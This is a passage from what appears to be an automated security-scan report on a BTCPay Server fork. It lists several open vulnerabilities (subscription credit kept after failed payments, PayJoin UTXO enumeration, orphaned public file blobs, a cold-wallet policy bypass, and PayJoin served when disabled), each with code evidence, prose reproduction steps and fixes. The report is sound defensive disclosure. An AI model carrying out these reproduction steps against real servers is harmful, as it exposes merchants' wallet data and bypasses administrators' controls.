5. [BTCPayServer/HostedServices/InvoiceWatcher.cs:134–178](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/InvoiceWatcher.cs#L134-L178)
   A Processing invoice whose accounted payments no longer cover the price (payment became Unaccounted after RBF/double-spend) reverts to New at line 150 with no event; one that never confirms by MonitoringExpiration (StoreBlob default 1 day) is set Invalid with the FailedToConfirm event (lines 167-168), not MarkedInvalid; only a confirmed payment produces Confirmed/Completed (lines 173-175).
6. [BTCPayServer/Events/InvoiceEvent.cs:12–20](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Events/InvoiceEvent.cs#L12-L20)
   FailedToConfirm (1013) is a distinct event code from MarkedInvalid (1008); only the latter passes the subscription service filter.
7. [BTCPayServer/Payments/Bitcoin/NBXplorerListener.cs:331–335](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/Bitcoin/NBXplorerListener.cs#L331-L335)
   Payments whose transaction is no longer valid (replaced / double-spent) are set to PaymentStatus.Unaccounted, which is what drives the Processing->New reversal.
8. [docs/users/offerings.md:79–81](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/docs/users/offerings.md#L79-L81)
   Documented guarantee: with optimistic activation, 'If the invoice later fails or is cancelled, the subscriber is deactivated.' The code only honours this for a manual merchant action.
9. [BTCPayServer.Tests/SubscriptionTests.cs:947–962](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Tests/SubscriptionTests.cs#L947-L962)
   The maintainers' test of the reversal only exercises the manual MarkInvoiceStatus(Invalid) path, confirming intent while leaving the automatic failure paths untested.

## Impact
Subscription state integrity is falsified: the attacker's subscriber record stays Active/Normal with a paid period and retains credit from money that never settled, and merchant-facing events/webhooks never signal the failure. Impact is confined to the attacker's own subscriber record (limited integrity), no confidentiality or availability effect.

## Reproduction steps
1. Attacker is a payer: anyone holding a shared plan-checkout link (public by design) or a subscriber using the portal's add-credit. They pay an on-chain invoice with a replaceable/low-fee transaction (optionally over-paying), receive activation and credit at zero confirmations, then replace or drop the transaction. No security mechanism must be defeated. Requires the merchant to have enabled OptimisticActivation on the plan (non-default) and an on-chain payment method.

## Recommended fix
1. The hosted service's InvoiceEvent filter excludes the automatic failure transitions (FailedToConfirm -> Invalid, and the Processing -> New/Expired reversal after a payment becomes unaccounted), so an optimistically activated subscription is never reconciled when its payment fails. Fix criteria: When an invoice that optimistically activated a plan or granted credit later transitions to Invalid (any cause, including FailedToConfirm) or loses its Processing status because the payment became unaccounted/expired, the subscriber must be deactivated/suspended and the merchant notified, matching the documented behaviour. Verify by paying with an RBF-replaceable transaction, replacing it, and observing suspension and a SubscriberDisabled event; also verify the FailedToConfirm path.
2. Credit granted from an unconfirmed payment (GetAmountToCredit on Processing) is never reversed when the payment fails, leaving phantom balance that auto-renewal and plan changes can spend. Fix criteria: Credit attributable to a payment that never settles must be reversed (or held as provisional until settlement) so that a subscriber's spendable balance never exceeds settled funds; verify that after a failed/replaced payment the credit history shows the reversal and the balance returns to its pre-payment value.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Business logic flaw
**CWE:** [CWE-841](https://cwe.mitre.org/data/definitions/841.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257289

---

# Wallet-receive payjoins never release the contributed UTXO lock, inverting the anti-probing reselection into a UTXO enumerator

## Details
BIP78 receivers must assume a payer may be probing the receiver's UTXO set. BTCPay's defences are (1) permanent 'K-' locks on the sender's inputs so one input set can extract only one proposal, and (2) a lock on the contributed hot-wallet UTXO that is released when the original transaction is seen or becomes unbroadcastable, combined with a blinded deterministic sort (UTXODeterministicComparer) so the same UTXO is reselected for later probes. Lock release is implemented solely in NBXplorerListener.UpdatePaymentStates (285-290, 348-357), which reads PayjoinInformation.ContributedOutPoints from an invoice's payment records and runs only per monitored invoice.

For the wallet-receive-address branch (PayJoinEndpointController 331-337) no invoice exists: the controller never persists a payment record (AddPayment is guarded by `if (invoice is not null)`, 530-547), calls ctx.Success() (558) which suppresses unlock-on-dispose (PayjoinReceiverContext 41-44), and PayjoinLocks rows have no expiry (PayJoinRepository 43-65). The lock on the merchant UTXO therefore persists until the merchant happens to spend that coin through the normal wallet, which never consults PayjoinLocks.

Consequences, for a payer holding a live receive-address BIP21 with pj= (handed out by the Receive page / Greenfield for hot-wallet stores with PayJoinEnabled; the endpoint also accepts receive addresses when PayJoinEnabled is off, filed separately):

1. UTXO enumeration at dust cost. due is forced to zero on this path, so any mempool-eligible dust payment to the receive address qualifies. The address stays in WalletReceiveService memory until NBXplorer reports a transaction paying it; the original is only saved offchain in BTCPay's DB and broadcast best-effort two minutes later, so within that window — and indefinitely if the payer broadcasts a conflicting spend of the original's inputs first — the payer can submit many originals with distinct inputs. SelectUTXO skips locked outpoints, so each probe yields a different hot-wallet UTXO (outpoint, value and pubkey, signed by the hot wallet). On the invoice path the same probe sequence is bounded: the lock is released within ~2 minutes / one block and the comparer reselects the same coin; here the exposure is cumulative and permanent.

2. Permanent shrinking of the payjoin pool. Each exposed UTXO fails TryLock for every future payjoin (invoice or receive) until the merchant spends it, so repeated probing drives the store to 'unavailable' for all legitimate payjoin attempts. Even benign receive-address payjoins where the payer falls back to broadcasting the original leave that coin locked out of payjoin.

The PayJoin rate limit (5r/min burst 3 per RemoteAddress, Startup.cs:309) is keyed on X-Forwarded-For, which the server trusts from any peer, so it does not bound the probe count. This is distinct from payjoin-wallet-receive-address-bypasses-payjoinenabled-setting: it exists even when the store has deliberately enabled payjoin.

## Evidence
1. [BTCPayServer/Payments/PayJoin/PayJoinEndpointController.cs:530–558](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/PayJoin/PayJoinEndpointController.cs#L530-L558)
   The BitcoinLikePaymentData carrying PayjoinInformation.ContributedOutPoints is persisted via AddPayment only when `invoice is not null`. On the wallet-receive-address branch invoice is null, so no record of the contributed outpoint exists anywhere; ctx.Success() at 558 then suppresses the only other unlock (PayjoinReceiverContext.DisposeAsync). This is the code the fix must change: the receive-address branch must arrange a release for the lock it takes.
2. [BTCPayServer/Payments/Bitcoin/NBXplorerListener.cs:348–357](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/Bitcoin/NBXplorerListener.cs#L348-L357)
   The only production caller of UTXOLocker.TryUnlock for contributed outpoints (besides the failure-only unlock in PayjoinReceiverContext). It is driven by payjoinInformation read from an invoice's payment records (285-290) inside UpdatePaymentStates, which runs per monitored invoice (231-243), so it never fires for a payjoin that has no invoice.
3. [BTCPayServer/Payments/PayJoin/PayjoinReceiverContext.cs:41–43](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/PayJoin/PayjoinReceiverContext.cs#L41-L43)
   Unlock of LockedUTXOs on dispose happens only when success is false; a successful receive-address proposal keeps the lock.
4. [BTCPayServer/Payments/PayJoin/PayJoinEndpointController.cs:637–676](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/PayJoin/PayJoinEndpointController.cs#L637-L676)
   SelectUTXO skips any outpoint whose TryLock fails and moves on to the next coin in the blinded deterministic order. Because receive-path locks are never released, every further probe is forced onto a different hot-wallet UTXO, which the controller then signs (493-512) and returns to the payer with its witness UTXO.
5. [BTCPayServer/Payments/PayJoin/PayJoinEndpointController.cs:331–337](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/PayJoin/PayJoinEndpointController.cs#L331-L337)
   Receive-address branch forces due = Money.Zero, so any mempool-eligible (dust-level) payment to a live receive address qualifies; each probe costs only dust plus fee.
6. [BTCPayServer/Payments/PayJoin/PayJoinEndpointController.cs:37–45](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/PayJoin/PayJoinEndpointController.cs#L37-L45)
   The maintainers' anti-probing design: a UTXO locked for a payjoin is expected to be unlocked once the original is seen or becomes unbroadcastable and then reselected first, so repeated probes expose the same coin. PayJoinTests.cs 1105-1108 and 1181-1182 test exactly this for the invoice path; nothing covers the receive path.
7. [BTCPayServer/Payments/PayJoin/PayJoinRepository.cs:43–64](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/PayJoin/PayJoinRepository.cs#L43-L64)
   PayjoinLocks rows are plain Id inserts with no timestamp or expiry; TryUnlock (21-37) is the only removal and FindLocks has no callers, so nothing else ever clears a stale lock.
8. [BTCPayServer/Services/Wallets/WalletReceiveService.cs:117–126](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Wallets/WalletReceiveService.cs#L117-L126)
   A receive address leaves memory only when NBXplorer reports a transaction paying it. The controller's SaveOffchainTransactionAsync writes only to BTCPay's DB and the original is broadcast best-effort 2 minutes later (DelayedTransactionBroadcaster), so the same address accepts repeated probes with distinct inputs during that window, and indefinitely if the payer conflicts the original before it is broadcast.
9. [BTCPayServer/Plugins/Wallets/Controllers/UIWalletsController.cs:890–897](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Wallets/Controllers/UIWalletsController.cs#L890-L897)
   Shipped feature: the wallet Receive page (and Greenfield GetOnChainWalletReceiveAddress, GreenfieldStoreOnChainWalletsController.cs 126-139) hands the payer a BIP21 with pj= whenever the store has a hot wallet and PayJoinEnabled, so merchants are expected to give receive addresses to payers for payjoin.

## Impact
Confidentiality: progressive, cumulative disclosure of the merchant hot wallet's UTXO set (outpoints, amounts, pubkeys), one new coin per cheap probe, defeating the privacy property payjoin exists to provide and the maintainers' reselection defence. Availability: each probed UTXO is removed from the payjoin pool until the merchant spends it, degrading the store's payjoin feature to 'unavailable'; ordinary spending is unaffected. No funds are lost: contributed value returns to the merchant's own output and the proposal is only valid if the payer signs it.

## Reproduction steps
1. Attacker is an anonymous payer holding a live wallet receive address (BIP21 with pj=) of a hot-wallet store, as the Receive page and Greenfield hand out. They repeatedly POST mempool-eligible dust originals with distinct inputs to the public /{cryptoCode}/pj endpoint; the address remains live for at least the 2-minute delayed-broadcast window and indefinitely if the payer conflicts each original before broadcast. Preconditions outside attacker control: hot wallet and a currently reserved receive address shared with them. The 5r/min rate limit keys on X-Forwarded-For trusted from any peer, so it is bypassable. No credentials or victim interaction.

## Recommended fix
Contributed-UTXO lock release depends on an invoice payment record carrying PayjoinInformation; payjoins against wallet receive addresses take the lock but persist no such record, so the lock is never released and the anti-probing reselection cannot occur. Fix criteria: Every contributed-UTXO lock taken by the payjoin endpoint is released when the original transaction is observed on the wallet or becomes unbroadcastable, regardless of whether an invoice was involved (e.g., persist a payjoin record for receive-address payjoins that the listener processes, or give PayjoinLocks rows an expiry tied to the delayed-broadcast window). Verify by performing a receive-address payjoin, letting the original broadcast, and confirming the PayjoinLocks row is gone and the same UTXO is selected on the next probe; and that a conflicted original also releases the lock.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Missing resource release
**CWE:** [CWE-772](https://cwe.mitre.org/data/definitions/772.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257287

---

# Greenfield file deletion removes DB record but leaves blob publicly served

## Details
The Greenfield endpoint `DELETE /api/v1/files/{fileId}` (GreenfieldFilesController.DeleteFile, admin-only via CanModifyServerSettings) deletes only the `StoredFile` database row through `StoredFileRepository.RemoveFile`. It does not call `IFileService.RemoveFile`, which is the routine every other deletion path uses (UIServerController.DeleteFile, GreenfieldUsersController profile-picture removal, GreenfieldStoresController logo removal) and which additionally invokes `provider.RemoveFile` to delete the underlying blob.

Consequence: after an administrator deletes a file through the API, the API and UI list no longer show it and `/Storage/{fileId}` returns 404, but the actual content remains stored and reachable:
- Local filesystem provider: the file `{StorageDir}/{guid}-{name}` stays on disk and `StorageExtensions.UseProviderStorage` serves the whole directory anonymously at `/LocalStorage/{guid}-{name}` with `ServeUnknownFileTypes = true`, so the direct URL that was previously handed out (FileData.Url, 'Permanent Url' on the Files page, the URL embedded in store/app/theme settings and emails) continues to work indefinitely.
- Azure Blob provider: the blob was uploaded with `BlobSecurity.Public` and remains publicly readable at its blob URL.

The swagger contract describes the operation as 'Deletes the file'. The maintainers' test (GreenfieldAPITests.CanCreateReadAndDeleteFiles) only asserts the listing becomes empty, so the leak is not caught.

Attacker: anyone who previously obtained the direct storage URL (a customer who saw a logo/asset, a recipient of a shared link, a search-engine cache) retains access to content the operator deliberately removed, e.g. a document uploaded by mistake or an asset later withdrawn. Because the record is gone, the admin also has no remaining UI/API handle to delete the orphaned blob, so the exposure is permanent without filesystem access. Impact is limited to confidentiality of files the administrator intended to withdraw; uploaded files are public by design while they exist, so the harm is continued exposure after an explicit deletion.

Assumption about dependency behaviour: TwentyTwenty.Storage.Local 3.0.0 `LocalStorageProvider.GetBlobUrl` returns the on-disk path and `DeleteBlobAsync` deletes the file; nothing in the Greenfield path calls the latter.

## Evidence
1. [BTCPayServer/Controllers/GreenField/GreenfieldFilesController.cs:66–73](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldFilesController.cs#L66-L73)
   DELETE /api/v1/files/{fileId} looks up the StoredFile and calls fileRepository.RemoveFile(file) (StoredFileRepository), which only deletes the database row. It never calls IFileService.RemoveFile, so the storage provider is not asked to delete the blob. This is the code the fix must change.
2. [BTCPayServer/Storage/Services/StoredFileRepository.cs:42–48](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Storage/Services/StoredFileRepository.cs#L42-L48)
   StoredFileRepository.RemoveFile only attaches and removes the entity from the DbContext; it has no knowledge of the storage provider or the on-disk/cloud blob.
3. [BTCPayServer/Storage/Services/FileService.cs:117–130](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Storage/Services/FileService.cs#L117-L130)
   FileService.RemoveFile is the complete deletion routine: it calls provider.RemoveFile (BaseTwentyTwentyStorageFileProviderServiceBase.RemoveFile -> DeleteBlobAsync) and then _fileRepository.RemoveFile. Every other deletion path in the tree (UIServerController.Storage.cs:74, GreenfieldUsersController.cs:309, GreenfieldStoresController.cs:183, GreenfieldAppsController.cs:317, UserService.cs:295) goes through it; the Greenfield files controller is the only caller of the repository method directly.
4. [BTCPayServer/Storage/StorageExtensions.cs:44–50](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Storage/StorageExtensions.cs#L44-L50)
   For the local filesystem provider, everything under StorageDir ({DataDir}/LocalStorage, Extensions.cs:1062) is served by UseStaticFiles at /LocalStorage with ServeUnknownFileTypes=true and no authorization. Because the blob file remains on disk after the API delete, it remains downloadable at its direct URL by anyone who knows it. For the Azure provider, the blob was created with BlobSecurity.Public (BaseTwentyTwentyStorageFileProviderServiceBase.AddFile:30) and likewise stays reachable.
5. [BTCPayServer/Hosting/Startup.cs:359–360](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/Startup.cs#L359-L360)
   app.UseProviderStorage(dataDirectories) is registered before app.UseAuthentication()/UseAuthorization(), so the /LocalStorage static-file middleware answers anonymous requests for the orphaned blob without any authentication.
6. [BTCPayServer/Controllers/UIServerController.Storage.cs:69–74](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIServerController.Storage.cs#L69-L74)
   The UI sibling (POST server/files/{fileId}/delete) calls _fileService.RemoveFile(fileId, null), which deletes blob and record. The two deletion paths are inconsistent; only the Greenfield one leaves the blob.
7. [BTCPayServer/wwwroot/swagger/v1/swagger.template.files.json:131–136](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/wwwroot/swagger/v1/swagger.template.files.json#L131-L136)
   The public API contract documents the operation as 'Deletes the file', so an admin relying on it reasonably believes the content is no longer retrievable.

## Impact
Confidentiality: content the administrator explicitly deleted stays retrievable indefinitely to anyone with its URL, and there is no remaining handle to remove it. Files are public while they exist, so this is continued exposure of withdrawn material rather than access to otherwise-protected data (LOW). No integrity impact; availability impact (orphaned disk usage) is negligible.

## Reproduction steps
1. A server admin deletes a file via `DELETE /api/v1/files/{fileId}` (API client, Greenfield). An unauthenticated party who already holds the file's direct storage URL (previously public, GUID-prefixed, handed out as the file's 'Permanent Url' or embedded in pages/emails) simply requests it again; the static-file middleware (or the public Azure blob) still returns the content. No credentials or interaction are needed, but it requires that the attacker already possesses the direct URL and that the deletion went through the API rather than the UI, which are conditions outside the attacker's control.

## Recommended fix
GreenfieldFilesController.DeleteFile removes the StoredFile database entity directly via StoredFileRepository instead of going through IFileService.RemoveFile, so the storage provider never deletes the blob and the content remains publicly served. Fix criteria: Deleting a file through the Greenfield API must remove the stored blob from the configured storage provider as well as the database record, matching the UI deletion path. Verification: upload a file via the API, record FileData.Url, delete it via DELETE /api/v1/files/{fileId}, then request the recorded URL anonymously; it must no longer return the file content (404 for local storage, not-found for cloud providers). A test asserting this should be added alongside CanCreateReadAndDeleteFiles.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Incomplete Cleanup
**CWE:** [CWE-459](https://cwe.mitre.org/data/definitions/459.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257279

---

# Greenfield wallet generation ignores the AllowCreateColdWalletForAll server policy enforced by the UI

## Details
Server administrators can leave `AllowCreateColdWalletForAll` disabled (its default: the property has no initializer and no migration sets it; Changelog 2.1.0 'Disable cold wallet creation by default (#6626)') so that non-admin store owners cannot have BTCPay/NBXplorer generate or import a wallet seed for them. The project documents this control (docs/users/README.md:93: 'The server administrator can disable wallet generation for non-administrators.') and the UI tells blocked users what is still permitted (GenerateWalletOptions.cshtml:70: 'this instance does not support creating a new cold wallet for non-administrators. However, you can import one from other wallet software.'). The cookie UI enforces it in `UIStoreOnChainWalletsController.GenerateWallet` on both GET (line 278) and POST (lines 321-324), returning 404 when `!CanCreateColdWallet && !SavePrivateKeys`.

The Greenfield equivalent, `POST /api/v1/stores/{storeId}/payment-methods/{paymentMethodId}/wallet/generate` (`GreenfieldStoreOnChainPaymentMethodsController.GenerateOnChainWallet`), obtains the same `WalletCreationPermissions` record but reads only its hot-wallet half: `if (request.SavePrivateKeys && !canUseHotWallet.CanCreateHotWallet)` (lines 45-50). `CanCreateColdWallet` is never consulted, and no authorization handler under BTCPayServer/Security reads this policy either. A non-admin holding an API key with `CanModifyStoreSettings` on a store with no configured on-chain wallet (or after removing one via the sibling delete endpoint) can therefore POST `{"savePrivateKeys": false}` (optionally with `existingMnemonic`) and have NBXplorer generate or import the seed, have the store's on-chain payment method configured with it, and receive the mnemonic in the response (line 108) — the operation the administrator's policy forbids and that the UI refuses for the same caller.

The project's own test suite exercises only the hot-wallet half through the API (GreenfieldAPITests.cs:2841-2847 asserts a `SavePrivateKeys` validation error for non-admin `client2`); every cold-wallet generation in that test is performed by an admin (`user.GrantAccessAsync(true)`), so the suite neither asserts nor sanctions non-admin cold-wallet generation.

Impact: a server-level administrative control is bypassed by a lower-privileged tenant through a parallel entry point with an inconsistent check (CWE-863). No other tenant's data or funds are affected and the key material belongs to the caller, so the effect is confined to the integrity of server policy.

## Evidence
1. [BTCPayServer/Plugins/Wallets/Controllers/GreenfieldStoreOnChainPaymentMethodsController.WalletGeneration.cs:45–50](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Wallets/Controllers/GreenfieldStoreOnChainPaymentMethodsController.WalletGeneration.cs#L45-L50)
   GenerateOnChainWallet computes WalletCreationPermissions but rejects only when `SavePrivateKeys` is true and `CanCreateHotWallet` is false. With `SavePrivateKeys` false (watch-only generation or seed import without stored keys) `CanCreateColdWallet` is never read, so the request proceeds to NBXplorer GenerateWalletAsync (line 61), configures the store (lines 97-100) and returns the mnemonic (line 108). This is the code the fix must change.
2. [BTCPayServer/Plugins/Wallets/Controllers/UIStoreOnChainWalletsController.cs:320–324](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Wallets/Controllers/UIStoreOnChainWalletsController.cs#L320-L324)
   The UI sibling for the identical operation (same CanModifyStoreSettings policy, same NBXplorer call) returns NotFound when `!perm.CanCreateColdWallet && !request.SavePrivateKeys`; the GET at line 278 applies the same gate. This is the shipped control the API path acts around.
3. [BTCPayServer/Extensions/AuthorizationExtensions.cs:21–40](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Extensions/AuthorizationExtensions.cs#L21-L40)
   CanUseHotWallet returns (true, true) for admins (Greenfield: CanModifyServerSettings) and otherwise CanCreateColdWallet = PoliciesSettings.AllowCreateColdWalletForAll. The Greenfield controller receives this record at line 45 but never reads CanCreateColdWallet.
4. [BTCPayServer/Services/PoliciesSettings.cs:56–57](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/PoliciesSettings.cs#L56-L57)
   The server-wide policy 'Non-admins can create Cold Wallets for their Store' is a plain bool with no initializer, so it defaults to false (disabled); no migration or hosted service sets it elsewhere.
5. [docs/users/README.md:93](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/docs/users/README.md#L93)
   Project documentation (linked from the Policies page) states 'The server administrator can disable wallet generation for non-administrators.' — the control the API path does not honour.
6. [BTCPayServer/Plugins/Wallets/Views/UIStoreOnChainWallets/GenerateWalletOptions.cshtml:70](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Wallets/Views/UIStoreOnChainWallets/GenerateWalletOptions.cshtml#L70)
   The UI tells blocked non-admins that the instance 'does not support creating a new cold wallet for non-administrators' and that importing from other wallet software is what remains permitted — i.e. xpub import is the sanctioned path; server-side seed generation/import is not.

## Impact
The caller obtains only key material generated for their own store, so no other party's confidentiality is affected. Integrity is low: a server administrator's configured, default-on restriction is bypassed and the server performs a seed-generation/import action the administrator disabled, configuring the store's payment method with the result. No availability effect.

## Reproduction steps
1. Attacker: a non-admin store owner, or any API key carrying CanModifyStoreSettings for a store whose on-chain payment method is unconfigured (the same permission allows removing an existing one first), on a server whose administrator has left `AllowCreateColdWalletForAll` disabled — the default state, so no non-default deployment condition is required. Delivery: one authenticated POST to /api/v1/stores/{storeId}/payment-methods/BTC-CHAIN/wallet/generate with `savePrivateKeys:false`. The cold-wallet check is simply absent on this path; nothing needs to be defeated. Assumption: NBXplorer.Client 5.0.11 `GenerateWalletAsync` with `SavePrivateKeys=false` generates (or imports) the seed and returns the mnemonic without storing the private key, as the project's own admin tests (GreenfieldAPITests.cs:2853-2885) rely on.

## Recommended fix
GenerateOnChainWallet enforces only the hot-wallet half of WalletCreationPermissions; the cold-wallet policy that the UI enforces for the identical operation is not applied on the Greenfield path, leaving two entry points with inconsistent authorization. Fix criteria: The Greenfield generate endpoint must refuse (with a validation/permission error) any request whose caller's WalletCreationPermissions.CanCreateColdWallet is false when `savePrivateKeys` is false, mirroring UIStoreOnChainWalletsController.GenerateWallet, ideally by sharing one gate between both controllers. Verify with a non-admin CanModifyStoreSettings API key on a server with AllowCreateColdWalletForAll disabled that `savePrivateKeys:false` requests (with and without `existingMnemonic`) are rejected and no payment method is configured; add that case next to the existing non-admin hot-wallet assertion in GreenfieldAPITests.OnChainPaymentMethodAPITests.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Incorrect authorization
**CWE:** [CWE-863](https://cwe.mitre.org/data/definitions/863.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257274

---

# PayJoin endpoint ignores store PayJoinEnabled setting for wallet receive addresses

## Details
The anonymous BIP78 receiver at POST /{cryptoCode}/pj (PayJoinEndpointController.Submit; no auth, [IgnoreAntiforgeryToken], CORS all, 5 req/min per remote address) has two matching paths for each output of the sender's transaction: (a) an invoice payment address, and (b) a wallet 'Receive' address held in WalletReceiveService memory (added whenever a store member opens the wallet Receive page or calls GET /api/v1/stores/{storeId}/payment-methods/{pmId}/wallet/address; it stays until a transaction paying it is observed, the wallet changes, or it is un-reserved). Path (a) honours the store's opt-in through the per-invoice PayjoinEnabled flag (lines 307-315), which BitcoinLikePaymentHandler.cs:182-184 derives from StoreBlob.PayJoinEnabled at invoice creation. Path (b) does not: lines 284-293 load the store's AccountDerivation, lines 331-337 set due = Money.Zero (so any mempool-valid output amount qualifies as 'fully paid'), and the code falls through to locking the sender's inputs, fetching the store's UTXO set and selecting/locking a merchant UTXO (340-366). The only store-level gate afterwards (384-391) is IsHotWallet plus derivation equality; StoreBlob.PayJoinEnabled is never consulted. The hot-wallet account key is then fetched from NBXplorer metadata (400-407) and used to sign the contributed input (493-512), and the proposal is returned to the anonymous caller.

Both producers of receive addresses (UIWalletsController.WalletReceive line 891, Greenfield GetOnChainWalletReceiveAddress line 133) compute allowedPayjoin = IsHotWallet && PayJoinEnabled and only then append pj= to the BIP21 link, and the setting's label is 'Enable Payjoin/P2EP' ('Enabling it gives your customers the option to use PayJoin'). That gate is advertisement only: the endpoint path is fixed and public.

Attack: a payer (threat-model adversary 5) who has been given a receive address by a hot-wallet store with PayJoin disabled builds any mempool-valid transaction paying that address (a dust-threshold amount suffices because due is forced to zero) with inputs of the same script type as the merchant's wallet, and POSTs it as text/plain to /BTC/pj. The server locks one of the store's UTXOs, signs it with the hot-wallet account key and returns the proposal. The payer thereby (1) learns a merchant UTXO (txid, vout, value, script) and that the store runs a hot wallet, and (2) causes the merchant's hot wallet to sign a coinjoin the merchant explicitly declined to participate in. The server also schedules the original transaction for broadcast two minutes later (line 398). Repeating the probe with fresh inputs against the same still-unused address yields a different UTXO each time (the contributed-UTXO lock on this path is never released; recorded separately).

Funds are not stolen: the contributed value is added to the merchant's own output (line 429) and, with due == 0, the fee loop at 452 never reduces that output, so impact is the privacy/consent property the PayJoinEnabled setting exists to protect.

## Evidence
1. [BTCPayServer/Payments/PayJoin/PayJoinEndpointController.cs:284–293](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/PayJoin/PayJoinEndpointController.cs#L284-L293)
   When the sender's output script matches an in-memory wallet 'Receive' address (WalletReceiveService.GetByScriptPubKey), the controller loads the store and its AccountDerivation and proceeds. Nothing in this branch consults store.GetStoreBlob().PayJoinEnabled; this is where the fix belongs.
